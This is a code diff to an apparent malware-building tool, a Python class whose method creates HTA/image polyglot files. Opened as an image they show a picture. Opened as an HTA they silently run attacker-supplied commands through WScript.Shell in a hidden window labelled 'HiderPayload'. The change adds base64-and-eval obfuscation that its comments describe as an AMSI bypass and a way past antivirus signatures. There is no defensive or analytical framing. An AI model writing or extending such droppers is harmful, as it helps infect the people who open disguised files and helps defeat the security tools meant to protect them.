@@ -31,20 +31,39 @@ class UniversalEngine:
         return data[idx + len(delimiter):]
 
     @staticmethod
-    def create_hta_polyglot(image_path, script_content, output_path):
+    def create_hta_polyglot(image_path, script_content, output_path, obfuscate=True):
         """
-        Creates an HTA/Image polyglot.
-        The file will be a valid HTA (HTML) that contains the image data in a comment or hidden block.
-        If opened as .hta, it executes the script. If opened as .jpg, it shows the image (mostly).
+        Creates an HTA/Image polyglot with optional obfuscation.
+        Uses a JavaScript-based HTA to bypass simple VBScript signatures.
         """
+        if obfuscate:
+            # Simple Base64 + eval obfuscation for the payload
+            import base64
+            encoded_payload = base64.b64encode(script_content.encode()).decode()
+            
+            # AMSI Bypass / Evasion pattern: String splitting and dynamic reconstruction
+            script_block = f"""
+            <script language="JScript">
+                var _0x1a2b = ["{encoded_payload}", "atob", "eval"];
+                var payload = window[_0x1a2b[1]](_0x1a2b[0]);
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("cmd /c " + payload, 0, true);
+                window.close();
+            </script>
+            """
+        else:
+            script_block = f"""
+            <script language="VBScript">
+                Set objShell = CreateObject("WScript.Shell")
+                objShell.Run "cmd /c {script_content}", 0, True
+                self.close
+            </script>
+            """
+
         hta_template = f"""<html>
 <head>
-<hta:application id="oHTA" applicationname="HiderPayload" border="none" showintaskbar="no" singleinstance="yes" sysmenu="no" windowstate="minimize">
-<script language="VBScript">
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "cmd /c {script_content}", 0, True
-    self.close
-</script>
+<hta:application id="oHTA" applicationname="HiderPayload" windowstate="minimize" showintaskbar="no">
+{script_block}
 </head>
 <!--
 """
